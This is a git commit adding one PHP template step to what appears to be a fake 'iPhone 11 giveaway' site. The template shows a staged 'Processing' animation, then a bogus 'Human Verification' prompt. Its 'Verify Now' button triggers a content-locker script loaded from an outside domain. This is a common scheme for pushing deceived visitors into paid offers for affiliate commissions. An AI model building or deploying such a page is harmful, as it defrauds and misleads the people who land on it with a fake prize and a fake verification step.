378c76efd2490bc68293db54238035d962d9af57
cpa-design <74383419+cpa-design@users.noreply.github.com>
2021-01-11 17:31:50 +0100

    Create s_4.php

---
+++ iphone11giveaway/parts/s_4.php
@@ -0,0 +1,16 @@
+<h1>4. Processing</h1>
+<p class="second-paragraph">Please wait while we submit your application.</p>							
+<div class="application-processing-wrapper">
+	<div class="application-processing-inner-wrapper">
+		<div class="cssload-loader-walk"><div></div><div></div><div></div><div></div><div></div></div>
+		<span class="console-msg"></span>
+		<div class="human-verification-wrapper">
+			<h3>Human Verification</h3>
+			<p>Congrats, your are almost done submitting your application. Click on the Verify Now button below to complete human verification.</p>
+			<div class="button-wrapper human-veirifcation-button-wrapper">
+                                				<a id="human-verification-button" class="button "  onclick="call_locker()">Verify Now</a>
+				<script type="text/javascript" id="ogjs" src="https://www.areyouabot.net/contentlockers/load.php?id=23153c0e456e3b0f33a00bec66b79109"></script>                                							</div>
+		</div>
+		<div id="progressBarConsole" class="console-loadbar"><div></div></div>		
+	</div>
+</div>
